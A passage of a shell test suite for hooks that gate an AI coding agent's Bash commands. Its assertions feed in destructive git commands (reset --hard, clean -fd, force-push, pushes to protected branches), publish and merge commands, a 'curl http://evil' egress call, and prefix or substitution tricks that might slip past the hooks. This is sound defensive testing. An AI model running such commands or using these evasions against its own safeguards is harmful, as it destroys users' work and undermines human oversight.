assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"sudo git checkout held\"}}"    "blocks a held checkout behind a sudo prefix (#193)"
# shellcheck disable=SC2016
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"echo \$(git checkout held)\"}}" "blocks a held checkout hidden inside a \$(...) command substitution (#200)"
assert_exit 0 "$BCHB" 'not-json'                                                                                              "fails open on malformed JSON"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git checkout held\"}}"                           "fails open when cwd is absent, never substitutes process cwd (#154)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git -C $heldwt checkout held\"}}" "allows a -C-redirected checkout instead of consulting the wrong repo's cwd (#154)"
# #211: bare `--exec-path` (no `=`) takes no value in real git — it must not be treated as
# consuming the next token, or the real `checkout`/target words shift out of the scan.
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git --exec-path checkout held\"}}" "blocks a held checkout past a bare --exec-path, which takes no value (#211)"
git -C "$tmprepo" worktree remove --force "$heldwt" 2>/dev/null || true
rm -rf "$tmprepo" "$heldwt"

echo "== block-sleep-loop.py =="
BSL="$HOOKS/block-sleep-loop.py"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while true; do check_status; sleep 5; done"}}'    "blocks a sleep inside a while loop (#181)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"for i in 1 2 3; do sleep 1; done"}}'              "blocks a sleep inside a for loop (#181)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"until curl -sf http://x; do sleep 2; done"}}'     "blocks a sleep inside an until loop (#181)"
assert_exit 0 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"sleep 5 && echo done"}}'                          "allows a bare sleep with no loop (#181)"
assert_exit 0 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"for f in *.sh; do shellcheck --version; done"}}'  "allows a loop with no sleep (#181)"
assert_exit 0 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"echo \"please wait\""}}'                          "allows a command that merely mentions waiting (#181)"
# #193: a wrapper/prefix word ahead of `sleep` must not shift the command word out of argv[0].
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while true; do command sleep 5; done"}}'          "blocks a sleep behind a command builtin prefix (#193)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while true; do env sleep 5; done"}}'              "blocks a sleep behind an env prefix (#193)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while true; do VAR=1 sleep 5; done"}}'            "blocks a sleep behind an inline env assignment (#193)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while true; do timeout 10 sleep 5; done"}}'       "blocks a sleep behind a timeout prefix (#193)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while true; do sudo sleep 5; done"}}'             "blocks a sleep behind a sudo prefix (#193)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while true; do stdbuf -o L sleep 5; done"}}'      "blocks a sleep behind a stdbuf -o L prefix (#198)"
# #196: a grouping/negation token ahead of the loop keyword must not shift it out of argv[0].
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"(while true; do sleep 5; done)"}}'                "blocks a sleep loop wrapped in a subshell (#196)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"{ until curl -sf http://x; do sleep 2; done; }"}}' "blocks a sleep loop wrapped in a brace group (#196)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"! while true; do sleep 5; done"}}'                "blocks a negated sleep loop (#196)"
# #229: `sleep` as the loop's OWN condition (no `;` before it) lands in the same piece as the loop
# keyword — must still be recognized, not just a `sleep` in a later piece/the loop body.
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while sleep 5; do check_status; done"}}'           "blocks sleep as the while loop condition itself (#229)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"until sleep 2; do check_status; done"}}'           "blocks sleep as the until loop condition itself (#229)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while command sleep 5; do check_status; done"}}'   "blocks sleep-as-condition behind a command builtin prefix (#229)"
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"! while sleep 5; do check_status; done"}}'         "blocks a negated sleep-as-condition loop (#229)"
# #200: a sleep hidden inside a $(...) command substitution nested in a loop piece must still be
# seen — `_hookutil.pieces()` recurses into substitutions, so this piece surfaces as its own
# `sleep 5` rather than staying buried inside `echo`'s argument.
# shellcheck disable=SC2016
assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while ! test -f /tmp/ready; do echo \"waiting $(sleep 5)\"; done"}}' "blocks a sleep hidden inside \$(...) in a loop piece (#200)"
assert_exit 0 "$BSL" 'not-json'                                                                                      "fails open on malformed JSON"
assert_exit 0 "$BSL" '{"tool_name":"Agent","tool_input":{"command":"while true; do sleep 5; done"}}'                 "ignores a non-Bash tool_name"

echo "== block-suppressed-stderr.py =="
BSS="$HOOKS/block-suppressed-stderr.py"
assert_exit 2 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x 2>/dev/null"}}'                     "blocks stderr redirected to /dev/null (#181)"
assert_exit 2 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x 2> /dev/null"}}'                    "blocks with a space before the redirect target (#181)"
assert_exit 2 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x &>/dev/null"}}'                     "blocks combined stdout+stderr redirect to /dev/null (#181)"
assert_exit 2 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x 2>>/dev/null"}}'                    "blocks an appending stderr redirect to /dev/null (#181)"
assert_exit 0 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x 2>&1"}}'                            "allows stderr duplicated onto stdout, not discarded (#181)"
assert_exit 0 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x >/dev/null"}}'                      "allows stdout-only suppression (#181)"
assert_exit 0 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"ffmpeg -loglevel 2 > /dev/null"}}'                "allows a numeric value merely preceding an unrelated redirect, not an fd-2 redirect (#181)"
# #201: the `>/dev/null 2>&1` idiom — stdout to null, then stderr duplicated onto wherever
# stdout now points — fully silences both streams and is at least as common as the bare `2>` form.
assert_exit 2 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x > /dev/null 2>&1"}}'                "blocks the >/dev/null 2>&1 idiom (#201)"
assert_exit 2 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x >/dev/null 2>&1"}}'                 "blocks the idiom with no space before /dev/null (#201)"
assert_exit 2 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x 1>/dev/null 2>&1"}}'                "blocks the idiom with an explicit 1> (#201)"
assert_exit 2 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x >>/dev/null 2>&1"}}'                "blocks the appending variant of the idiom (#201)"
assert_exit 0 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x 2>&1 >/dev/null"}}'                 "allows the reordered form (stderr dup'd before stdout is redirected, so stderr stays visible) (#201)"
assert_exit 0 "$BSS" 'not-json'                                                                                      "fails open on malformed JSON"
assert_exit 0 "$BSS" '{"tool_name":"Agent","tool_input":{"command":"curl http://x 2>/dev/null"}}'                    "ignores a non-Bash tool_name"

echo "== block-destructive-git.py =="
BDG="$HOOKS/block-destructive-git.py"
# Every predicate here reads live repo state from cwd, so build a throwaway repo (#230), same
# pattern block-checkout-held-branch.py's tests use.
dgrepo="$(mktemp -d)"
git -C "$dgrepo" init -q -b main
git -C "$dgrepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init

# git reset --hard
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git reset --hard\"}}"            "allows reset --hard on a clean tree — nothing to lose (#230)"
echo x > "$dgrepo/f.txt"
git -C "$dgrepo" add f.txt
git -C "$dgrepo" -c user.email=t@t -c user.name=t commit -q -m "add f"
echo y >> "$dgrepo/f.txt"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git reset --hard\"}}"            "blocks reset --hard over an uncommitted tracked change (#230)"
git -C "$dgrepo" checkout -q -- f.txt
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git reset --soft HEAD~1\"}}"     "allows a non-hard reset (#230)"

# git clean
echo untracked > "$dgrepo/u.txt"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git clean -fd\"}}"               "blocks clean -fd when an untracked file would actually be removed (#230)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git clean -nfd\"}}"              "allows clean when -n/--dry-run is set, even combined with force (#230)"
rm -f "$dgrepo/u.txt"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git clean -f\"}}"                "allows clean -f when there is nothing untracked to remove (#230)"

# git branch -D
git -C "$dgrepo" branch merged-branch
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git branch -D merged-branch\"}}" "allows branch -D on a branch already merged into HEAD — -d would succeed too (#230)"
git -C "$dgrepo" branch -D merged-branch >/dev/null
git -C "$dgrepo" branch unmerged-branch
git -C "$dgrepo" checkout -q unmerged-branch
echo z > "$dgrepo/g.txt"
git -C "$dgrepo" add g.txt
git -C "$dgrepo" -c user.email=t@t -c user.name=t commit -q -m "unmerged commit"
git -C "$dgrepo" checkout -q main
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git branch -D unmerged-branch\"}}" "blocks branch -D on a branch NOT merged into HEAD (#230)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git branch -d merged-branch\"}}"   "allows the plain -d form (git itself already refuses on unmerged) (#230)"

# git stash drop / git stash clear
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git stash clear\"}}"               "allows stash clear when the stash list is already empty — nothing to lose (#239)"
echo w > "$dgrepo/w.txt"
git -C "$dgrepo" add w.txt
git -C "$dgrepo" stash push -q -m stashed
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git stash drop\"}}"                "blocks stash drop when the stash list is non-empty (#239)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git stash clear\"}}"               "blocks stash clear when the stash list is non-empty (#239)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git stash list\"}}"                "allows a non-drop/clear stash subcommand (#239)"
git -C "$dgrepo" stash drop -q

# git checkout -- . / git restore .
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout -- .\"}}"           "allows checkout -- . on a clean tree — nothing to discard (#230)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout HEAD -- .\"}}"      "allows checkout <tree-ish> -- . on a clean tree (#238)"
echo y >> "$dgrepo/f.txt"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout -- .\"}}"           "blocks checkout -- . discarding an uncommitted tracked change (#230)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git restore .\"}}"               "blocks restore . discarding an uncommitted tracked change (#230)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout HEAD -- .\"}}"      "blocks checkout <tree-ish> -- . discarding a tracked change (#238)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout main .\"}}"         "blocks checkout <tree-ish> . (no --) discarding a tracked change (#238)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout -- f.txt\"}}"       "allows discarding one specific file, not the whole tree (#230)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout HEAD -- f.txt\"}}"  "allows a tree-ish restore of one specific file, not the whole tree (#238)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git restore --staged .\"}}"      "allows a --staged-only restore — working tree files are untouched (#230)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git restore -s HEAD .\"}}"        "blocks restore -s <tree> . (separate-token --source), not the staged toggle (#240)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git restore -S .\"}}"             "allows restore -S . (short --staged) — working tree files are untouched (#240)"
git -C "$dgrepo" checkout -q -- f.txt

# git push -f / --force: needs a real remote to reason about fast-forward-ness.
dgremote="$(mktemp -d)"
git -C "$dgremote" init -q --bare -b main
git -C "$dgrepo" remote add origin "$dgremote"
git -C "$dgrepo" push -q origin main
git -C "$dgrepo" checkout -q -b scratch
echo a > "$dgrepo/a.txt"
git -C "$dgrepo" add a.txt
git -C "$dgrepo" -c user.email=t@t -c user.name=t commit -q -m "scratch commit"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -f origin scratch\"}}"  "allows force-push of a brand-new branch never pushed before — nothing to lose (#230)"
git -C "$dgrepo" push -q origin scratch
echo b >> "$dgrepo/a.txt"
git -C "$dgrepo" add a.txt
git -C "$dgrepo" -c user.email=t@t -c user.name=t commit -q -m "ff commit"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -f origin scratch\"}}"  "allows a fast-forward force-push (#230)"
git -C "$dgrepo" push -q origin scratch
git -C "$dgrepo" reset -q --hard HEAD~1
echo c >> "$dgrepo/a.txt"
git -C "$dgrepo" add a.txt
git -C "$dgrepo" -c user.email=t@t -c user.name=t commit -q -m "divergent commit"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -f origin scratch\"}}"  "blocks a force-push that would discard commits on the remote (#230)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin +scratch:refs/heads/scratch\"}}" "blocks a force-push whose refspec destination is fully-qualified (refs/heads/...), not just a short name (#261)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -uf origin scratch\"}}" "blocks a bundled -uf (set-upstream+force) push that would discard commits (#235)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -fu origin scratch\"}}" "blocks a bundled -fu push that would discard commits (#235)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -f -o ci.skip origin scratch\"}}" "blocks a force-push with a push-option value token after -f, before the refs (#237)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -o ci.skip -f origin scratch\"}}" "blocks a force-push with a push-option value token before -f (#237)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push --force-with-lease origin scratch\"}}" "allows --force-with-lease — git's own safe form (#230)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch\"}}"     "allows a non-force push (#230)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch -ofield=1\"}}" "allows a non-force push with a glued push-option value containing an 'f' byte, not misread as -f (#246)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -f origin scratch -ofield=1\"}}" "still blocks a real force-push alongside a glued push-option value (#246)"

# #245: a bundled -fd (force+delete) must be recognized as an out-of-scope delete-push (a
# different risk not handled by this fast-forward/ancestor check), not evaluated as an ordinary
# force-push — which, for a diverged branch like this one, would otherwise wrongly block it.
git -C "$dgrepo" checkout -q -b delbranch
echo d > "$dgrepo/d.txt"
git -C "$dgrepo" add d.txt
git -C "$dgrepo" -c user.email=t@t -c user.name=t commit -q -m "delbranch commit"
git -C "$dgrepo" push -q origin delbranch
git -C "$dgrepo" reset -q --hard HEAD~1
echo e > "$dgrepo/e.txt"
git -C "$dgrepo" add e.txt
git -C "$dgrepo" -c user.email=t@t -c user.name=t commit -q -m "delbranch divergent commit"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -fd origin delbranch\"}}" "recognizes a bundled -fd as an out-of-scope delete-push, not a force-push needing a fast-forward check (#245)"

# wrapper/prefix + fail-open/ignore contract, same shape as the other rails
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"sudo git push -f origin scratch\"}}" "blocks a destructive push behind a sudo prefix (#230)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"echo git reset --hard\"}}"       "allows a non-git command that merely mentions reset --hard (#230)"
assert_exit 0 "$BDG" 'not-json'                                                                                                  "fails open on malformed JSON (#230)"
assert_exit 0 "$BDG" '{"tool_name":"Agent","tool_input":{"command":"git reset --hard"}}'                                         "ignores a non-Bash tool_name (#230)"
assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"git reset --hard"}}'                                          "fails open when cwd is absent, never substitutes process cwd (#230)"

# gh pr merge / gh release create / npm publish (#242) — unconditional, no repo state needed, so
# these fire even with no cwd in the envelope at all.
assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"gh pr merge 123"}}'                                            "blocks gh pr merge (#242)"
assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"gh pr merge 123 --squash --auto"}}'                           "blocks gh pr merge regardless of merge-method/auto flags (#242)"
assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"gh release create v1.0.0"}}'                                  "blocks gh release create (#242)"
assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"gh release create v1.0.0 --draft"}}'                          "allows gh release create --draft — not visible until a later publish step (#242)"
assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm publish"}}'                                               "blocks npm publish (#242)"
assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm publish --dry-run"}}'                                     "allows npm publish --dry-run — nothing actually goes out (#242)"
assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"sudo npm publish"}}'                                          "blocks npm publish behind a sudo prefix (#242)"
assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"echo gh pr merge 123"}}'                                      "allows a non-gh command that merely mentions pr merge (#242)"
assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"gh pr view 123"}}'                                            "allows an ordinary read-only gh pr subcommand (#242)"

# git push straight to a GitHub-protected branch (#252) — gated on a real `gh api
# repos/{owner}/{repo}/branches/<branch>/protection` check, not a branch-name guess. Stub `gh` on
# PATH so the check is deterministic without a real GitHub remote/auth.
dgghstub="$(mktemp -d)"
cat > "$dgghstub/gh" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "api" ]; then
  case "$2" in
    */branches/main/protection) exit 0 ;;
    *) exit 1 ;;
  esac
fi
exit 1
EOF
chmod +x "$dgghstub/gh"
dgoldpath="$PATH"
PATH="$dgghstub:$PATH"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin main\"}}"        "blocks a direct push to a branch GitHub reports as protected (#252)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch\"}}"     "allows a push to a branch GitHub does NOT report as protected (#252)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin HEAD:main\"}}"   "blocks a push whose refspec destination resolves to the protected branch name (#252)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin :main\"}}"       "allows a delete-refspec push — no content pushed, out of scope (#252)"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push --all origin\"}}"       "allows a multi-ref --all push — too ambiguous to resolve a single destination (#252)"
assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"sudo git push origin main\"}}"   "blocks a direct push to a protected branch behind a sudo prefix (#252)"
PATH="$dgoldpath"
assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin main\"}}"        "allows a direct push to main when gh can't confirm protection (no gh/auth/remote) — fail open (#252)"
rm -rf "$dgghstub"

rm -rf "$dgrepo" "$dgremote"

echo "== pretooluse-bash.py (#163 envelope dispatcher) =="
PTB="$HOOKS/pretooluse-bash.py"
# The dispatcher registers all five rails' check() predicates behind one envelope read — a
# representative case per rail (full contract already covered above), plus the envelope-level
# fail-open/ignore cases the dispatcher now owns instead of each rail.
assert_exit 2 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"curl http://evil"}}'                                           "dispatches to the egress rail and blocks a bare curl (#163)"
assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                 "dispatches through every rail and allows a plain command (#163)"
assert_exit 0 "$PTB" 'not-json'                                                                                                   "fails open on malformed JSON (#163)"
assert_exit 0 "$PTB" '{"tool_name":"Agent","tool_input":{"command":"curl http://evil"}}'                                          "ignores a non-Bash tool_name (#163)"
assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":123}}'                                                          "fails open on a non-string command (#163)"
assert_exit 2 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"while true; do sleep 5; done"}}'                               "dispatches to the sleep-loop rail and blocks a polling loop (#181)"
assert_exit 2 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"curl http://x 2>/dev/null"}}'                                  "dispatches to the suppressed-stderr rail and blocks it (#181)"
tmprepo="$(mktemp -d)"
heldwt="$(mktemp -d)"
git -C "$tmprepo" init -q -b main
git -C "$tmprepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
git -C "$tmprepo" branch held
git -C "$tmprepo" worktree add -q "$heldwt" held
assert_exit 2 "$PTB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout held\"}}"           "dispatches to the checkout rail and blocks a held-branch checkout (#163)"
assert_exit 0 "$PTB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout main\"}}"           "dispatches to the checkout rail and allows the current branch (#163)"
echo x > "$tmprepo/f.txt"
git -C "$tmprepo" add f.txt
assert_exit 2 "$PTB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git reset --hard\"}}"            "dispatches to the destructive-git rail and blocks reset --hard over a dirty tree (#230)"
git -C "$tmprepo" worktree remove --force "$heldwt" 2>/dev/null || true
rm -rf "$tmprepo" "$heldwt"

# --- layer 3: real-shape fixture corpus (#117) --------------------------------------------
# Layer 2's JSON is hand-authored, so a hook that mis-models the REAL Claude Code tool-input /
# transcript shape passes there against a matching wrong guess — the exact failure the whole
# hook bug history (#62/#80/#105/#108/#111/#112) keeps repeating. Layer 3 drives each hook
# against committed fixtures captured in the real envelope shape (full PreToolUse payloads +
# Stop-hook transcript JSONL) so a shape drift fails CI here instead of at runtime. The corpus
# and how to regenerate/redact it live in tests/fixtures/README.md.
echo "== real-shape fixture corpus (tests/fixtures) =="
if ! python3 "$REPO_DIR/tests/run_fixture_corpus.py"; then
  fail=1
fi

if [ "$fail" -ne 0 ]; then
  echo "HOOK TESTS FAILED" >&2
  exit 1
fi
echo "all hook tests passed"
